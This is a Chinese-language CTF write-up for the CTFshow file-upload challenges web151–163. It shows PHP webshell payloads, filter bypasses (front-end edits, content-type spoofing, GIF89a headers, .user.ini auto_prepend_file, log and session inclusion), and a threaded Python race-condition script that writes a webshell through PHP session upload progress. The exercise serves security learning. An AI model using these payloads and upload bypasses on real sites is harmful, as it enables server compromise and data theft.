---
title: CTFshow 文件上传web151-170
date: 2024-07-30 14:52:41
permalink: /pages/06f28c/
categories:
  - wp
tags:
  - 文件上传
author: 
  name: ajay
  link: https://the0n3.top
---
# CTFshow 文件上传web151-170

在linux服务器类型的文件上传，大多考察前端验证文件类型，后端验证content-type、文件名、扩展名、文件头、文件内容等

## web 151  前端验证

f12看源码js，没有学过js大概也可以看出来这个功能，只允许png上传

![png](https://the0n3.top/medias/show-upload/1.png)

前端js防君子不防小人(😀)，把png修改为php，或者添加php都可以

![php](https://the0n3.top/medias/show-upload/2.png)

```
lay-data="{url: 'upload.php', accept: 'images',exts:'png|php'}
```

修改后就可以上传木马了

## web 152 验证content-type

f12看源码，像上题一样做。会报错类型错误

![f12](https://the0n3.top/medias/show-upload/3.png)

那么应该是post报文里的content-type被检测到了，用bp抓包修改一下，修改为允许的png图片的content-type类型

![post](https://the0n3.top/medias/show-upload/4.png)

把1.png木马名改回1.php，content-type修改为image/png就可以上传了

## web 153 

这次后端验证文件名，只能上传png图片马了，利用.user.ini配置文件来包含图片马
准备一个马1.php，修改为png后缀，直接上传1.png

准备一个.user.png文件，用bp修改为原来的.user.ini名字，.user.ini内容

![ini](https://the0n3.top/medias/show-upload/5.png)

写一个配置项即可
```ini
# 在所有页面加载前，自动包含指定文件，文件内的php代码会正常执行
auto_prepend_file=1.png
# 在文件加载后包含
auto_append_file=1.png
```

提示成功上传到/upload/目录下，到upload目录下成功解析为php木马

![upload](https://the0n3.top/medias/show-upload/6.png)

## web 154 文件内容验证

正常上传一个图片马，提示内容不合规

![upload](https://the0n3.top/medias/show-upload/7.png)

(稍加思索.png)，大概是文件内容开头的<?php被检测到了，稍加修改

```php
<?=highlight_file(__FILE__);eval($_GET[1]);?>
```

上传成功。那么再试试上一题的.user.ini还能不能用，上传.user.png，bp修改为.user.ini，成功上传并解析php代码

![=](https://the0n3.top/medias/show-upload/8.png)

## web 155 内容检测

正常上传图片马，提示文件类型不对？？用上题的方法可以正常做出来。

好奇。用上题的方法挂马后查看一下这题的源码，真的还是检测文件内容

```php
if($_FILES['file']['type'] == 'image/png'){
            $arr = pathinfo($filename);
            $ext_suffix = $arr['extension'];
            if($ext_suffix!='php'){
                $content = file_get_contents($_FILES["file"]["tmp_name"]);
                if(stripos($content, "php")===FALSE){
                    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$_FILES["file"]["name"]);
                    $ret = array("code"=>0,"msg"=>"upload/".$_FILES["file"]["name"]);
                }else{
                    $ret = array("code"=>2,"msg"=>"文件类型不合规");
                }
                
            }else{
                $ret = array("code"=>2,"msg"=>"文件类型不合规");
            }
    		
    	}else{
    		$ret = array("code"=>2,"msg"=>"文件类型不合规");
    	}
```

## web 156 内容检测

这次还是内容检测。过滤了'php'字符串,'[]'中括号等。学到了新方法。原来还能用花括号

![花花](https://the0n3.top/medias/show-upload/9.png)

```php
<?=eval($_GET{1});?>
```

![花花](https://the0n3.top/medias/show-upload/10.png)

又get到了

## web 157 内容检测

这题又过滤了{}花括号，分号，'log'。思路还和上面一样，不过变成了RCE类型的题目了

还是正常上传.user.png文件，bp抓包把文件名改成.user.ini。接着处理图片马

```php
<?=`ls /var/www/html`?>
```

现在直接使用反引号执行命令，没有分号用?>强制闭合

![ls](https://the0n3.top/medias/show-upload/11.png)

每个马执行一条命令，过滤了'php'，用统配符处理

```php
<?=`tac /var/www/html/f*`?>
```

![tac](https://the0n3.top/medias/show-upload/12.png)

## web 158 内容检测

同上

```php
preg_match('/php|\{|\[|\;|log/i', $str);
```

检查upload.php源码发现过滤新增了log，那么上一题题应该考察日志包含了，或许这题考察的才是反引号命令执行？

<?=include'/var/log/nginx/access.log'?>

我回去试试，等我

测试成功，看来web157考察的真是日志包含，不过既然include结构和函数都能用，那么session包含应该也是行动通的，师傅们可以试试

![log](https://the0n3.top/medias/show-upload/13.png)

:::warning
往后做了几题后猛回头，既然.user.ini中的**auto_prepend_file**配置项功能就是文件包含，那么为什么多次一举再用一个1.png的图片马来实现文件包含，日志包含，session包含呢？不太行，ini文件不能拼接没有php玩法多，禁用'log'直接g，我们是聪明宝贝不上当(柴郡猫猫)
:::


## web 159 内容检测

还是可以上面用反引号命令执行马的玩法，进行上传测试，成功。

```php
<?=`tac /var/www/html/f*`?>
```

部分源码

```php
preg_match('/php|\{|\[|\;|log|\(/i', $str);
```


看upload.php源码，这回过滤了英文半角括号，禁用函数了，不过include语法结构还是可以用的，log过滤了，师傅们可以试试session包含，需要条件竞争

```php
<?=include'/tmp/sess_sessionID'>
```

## web 160 内容检测

反引号执行命令的方法行不通了，大抵被ban了，看了师傅们的做法，又学到了，本以为禁用'log'就不能文件包含了，没想到师傅们竟然拼接来实现了

```php
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

![log](https://the0n3.top/medias/show-upload/14.png)

查看源码,过滤了空格和反引号

```php
preg_match('/php|\{|\[|\;|log|\(| |\`/i', $str);
```

## web 161 检测文件头

这题添加新的限制：文件头，给上面图片马添加了一个GIF89a的文件头，上传成功
```php
GIF89a
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

.user.ini也要加上GIF89a文件头，上传成功
![add](https://the0n3.top/medias/show-upload/15.png)

讲讲其他

这道题的部分源码

```php
if($ext_suffix!='php'){
                $content = file_get_contents($_FILES["file"]["tmp_name"]);
                if(stripos($content, "php")===FALSE && check($content) && getimagesize($_FILES["file"]["tmp_name"])){
                    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$_FILES["file"]["name"]);
                    $ret = array("code"=>0,"msg"=>"upload/".$_FILES["file"]["name"]);
                }else{
                    $ret = array("code"=>2,"msg"=>"文件类型不合规");
                }
                
            }else{
                $ret = array("code"=>2,"msg"=>"文件类型不合规");
            }
```
在第四行出现了getimagesize，看函数名就可以知道是检查图片文件大小，出题人竟然用在这里来检查是不是图片(恼)，看到文件名我跳过去了，还疑惑为什么整份源码没有检查文件头的代码

看看官方文档[PHP官方对该函数的解析](https://www.php.net/manual/zh/function.getimagesize.php)

![getimagesize](https://the0n3.top/medias/show-upload/16.png)

## web 162 session包含

可恶！竟然还是躲不掉。到了紧张刺激的session包含，我之前写过一篇[session包含](https://the0n3.top/pages/07a506/)

这题测试上一题的解法行不通了，应该是把.也过滤了，禁止通过拼接来绕过，那就试试session包含

图片马test.png，上传时bp把扩展名去掉
```php
GIF89a
<?=include"/tmp/sess_Cola"?>
```
![test](https://the0n3.top/medias/show-upload/18.png)

这个烧题，不带扩展名的文件也可以上传(恼)，带GIF89a头过getimagesize函数，那玩法就多了

```ini
GIF89a
auto_prepend_file=test
```

把.user.ini传上去

![ini](https://the0n3.top/medias/show-upload/17.png)

准备条件竞争脚本
```python
import requests
import threading
import time

# 如果题目链接是https，换成http
# url = 'https://85a94ccd-c8d7-40ac-ae8f-38ce8f7febb6.challenge.ctf.show/'
url = 'http://c451c8da-a286-4835-a23a-bd6cd7e91f5a.challenge.ctf.show/upload/'
sessionid = 'Cola'
data = {
    # session文件内容
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php file_put_contents("shell.php","<?php phpinfo();?>");?>',
    # session文件路径可能不同
}

file = {
    'file': sessionid
}

cookies = {
    'PHPSESSID': sessionid
}

# 上传文件函数
def upload_file():
    while True:
        response = requests.post(url, data=data, files=file, cookies=cookies)
        time.sleep(1)  # 为了避免发送请求过快，可以适当增加间隔时间

# 检查文件是否已创建
def check_file():
    while True:
        r = requests.get(url + 'shell.php')
        if r.status_code == 200:
            print('Webshell created successfully')
            print(r.text)
            break
        else:
            print('error：', r.status_code)
        # time.sleep(1)  # 为了避免发送请求过快，可以适当增加间隔时间

# 创建并启动线程
threads = []
for _ in range(5):  # 创建5个上传线程
    t = threading.Thread(target=upload_file)
    t.start()
    threads.append(t)

for _ in range(5):  # 创建5个检查线程
    t = threading.Thread(target=check_file)
    t.start()
    threads.append(t)

# 等待所有线程完成
for t in threads:
    t.join()

```
脚本跑完就写入shell.php了，木马内容可以在脚本里修改
![shell](https://the0n3.top/medias/show-upload/19.png)

例如直接查看flag，注意转义
```
'PHP_SESSION_UPLOAD_PROGRESS': '<?php file_put_contents("shell.php","<?php system(\'tac /var/www/html/flag.php\');?>");?>',
```

![flag](https://the0n3.top/medias/show-upload/20.png)

这题看别的师傅是使用vps，把ip转成单个数字避免.的出现来做的

## web 163  条件竞争

这题如果上传上一题的test.png，以及.user.png，再去掉test.png的.png，把.user.ini修改为.user.ini时，页面会提示没有test这个文件，无法包含

url/test，到了首页，url/.user.ini会下载.user.ini，说明.user.ini还在，那么可以省略掉test.png这一步，让.user.ini直接给当前目录所有文件包含session文件


```ini
GIF89a
auto_prepend_file=/tmp/sess_Cola
```

上传.user.ini后，再次使用上题的脚本，发现这次跑了很久，不过还好，还是出来了

## 持续更新中......